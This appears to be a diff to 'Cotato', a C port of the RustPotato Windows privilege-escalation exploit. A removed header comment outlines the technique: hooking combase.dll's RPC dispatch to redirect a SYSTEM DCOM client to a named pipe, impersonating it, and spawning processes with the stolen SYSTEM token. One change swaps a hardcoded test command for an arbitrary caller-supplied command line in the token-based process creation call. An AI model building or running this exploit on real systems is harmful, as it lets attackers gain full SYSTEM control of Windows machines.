@@ -1,24 +1,11 @@
-/*
- * Cotato - C port of RustPotato
- *
- *  1. Find combase.dll in the PEB module list
- *  2. Scan its image for the RPC_SERVER_INTERFACE matching ORCB GUID
- *  3. Hook the first entry in MIDL dispatch table -> our UseProtseq shim
- *     that redirects RPC to our named pipe
- *  4. Create the named pipe, wait for the SYSTEM DCOM client to connect
- *  5. ImpersonateNamedPipeClient -> iterate process tokens -> find S-1-5-18
- *  6. DuplicateToken + CreateProcessWithTokenW to run arbitrary command
- *
- * NT API functions are resolved via GetModuleHandleA / GetProcAddress only.
- * No direct syscalls.
- */
-
 #define WIN32_LEAN_AND_MEAN
 #include <windows.h>
 #include <sddl.h>
 #include <stdio.h>
 #include <string.h>
 #include <stdint.h>
+#include <objbase.h>
+#include <objidl.h>
 #include "Native.h"
 
 #define NT_SUCCESS(s)         ((NTSTATUS)(s) >= 0)
@@ -606,9 +593,6 @@ static DWORD WINAPI PipeServerThread(LPVOID param) {
     return 0;
 }
 
-#include <objbase.h>
-#include <objidl.h>
-
 static const signed char b64dec[256] = {
     -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
     -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
@@ -918,7 +902,7 @@ static BOOL ExecuteCommand(HANDLE hToken, const wchar_t *cmdLine) {
     cmdBuf[4095] = L'\0';
 
     BOOL ok = _CreateProcessWithTokenW(
-        hToken, 0, NULL, L"cmd.exe /c echo > C:\\out.txt",
+        hToken, 0, NULL, cmdBuf,
         CREATE_UNICODE_ENVIRONMENT | CREATE_NO_WINDOW,
         NULL, NULL, &si, &pi
     );
